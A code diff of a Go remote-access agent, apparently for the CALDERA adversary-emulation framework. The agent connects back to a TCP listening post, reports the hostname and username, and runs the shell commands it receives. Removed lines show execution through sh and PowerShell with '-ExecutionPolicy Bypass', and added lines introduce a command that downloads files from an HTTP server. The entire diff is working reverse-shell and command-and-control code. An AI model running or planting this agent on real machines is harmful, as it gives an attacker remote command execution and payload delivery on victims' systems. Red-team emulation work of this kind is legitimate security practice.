@@ -4,43 +4,39 @@ import (
    "bufio"
    "fmt"
    "net"
-   "os/exec"
    "strings"
    "os"
    "os/user"
    "time"
-   "runtime"
    "flag"
+
+   "./commands"
 )
 
-func execute(command string) ([]byte, error) {
-	if runtime.GOOS == "windows" {
-		return exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
-   } 
-	return exec.Command("sh", "-c", command).Output()
+var httpServer string
+
+func runNextCommand(message string) []byte {
+   if strings.HasPrefix(message, "cd") {
+      pieces := strings.Split(message, "cd")
+      bites := commands.ChangeDirectory(pieces[1])
+      return bites
+   } else if (strings.HasPrefix(message, "download")) {
+      pieces := strings.Split(message, "download")
+      go commands.Download(httpServer, pieces[1])
+      return []byte("Download initiated\n")
+   } else {
+      bites := commands.Execute(message)
+      return bites
+   }
 }
 
-func push(conn net.Conn) {
-   for {
-      message, _ := bufio.NewReader(conn).ReadString('\n')
-      if len(message) == 0 {
-         break
-      }
-      message = strings.TrimSuffix(string(message), "\n")
-      message = strings.TrimSpace(message)
-
-      if strings.HasPrefix(message, "cd") {
-         pieces := strings.Split(message, "cd")
-         os.Chdir(strings.TrimSpace(pieces[1]))
-         conn.Write([]byte(" "))
-      } else {
-         output, err := execute(message)
-         if err != nil {
-            conn.Write([]byte(string(err.Error())))
-         }
-         conn.Write([]byte(fmt.Sprintf("%s%s", output, "\n")))
-      }
-   }
+func listen(conn net.Conn) {
+   scanner := bufio.NewScanner(conn)
+    for scanner.Scan() {
+       message := scanner.Text()
+       bites := runNextCommand(message)
+       conn.Write(bites)
+    }
 }
 
 func main() {
@@ -48,18 +44,20 @@ func main() {
    user, _ := user.Current()
    paw := fmt.Sprintf("%s$%s", host, user.Username)
 
-   server := flag.String("server", "127.0.0.1:5678", "The IP of CALDERA listening post")
+   tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
+   http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
    flag.Parse()
-   
+   httpServer = *http
+
    for {
-      conn, err := net.Dial("tcp", *server)
+      conn, err := net.Dial("tcp", *tcp)
       if err != nil {
          fmt.Println(err)
          time.Sleep(5 * time.Second)
          continue
       }
       conn.Write([]byte(paw))
-      push(conn)
+      listen(conn)
    }
 }
 
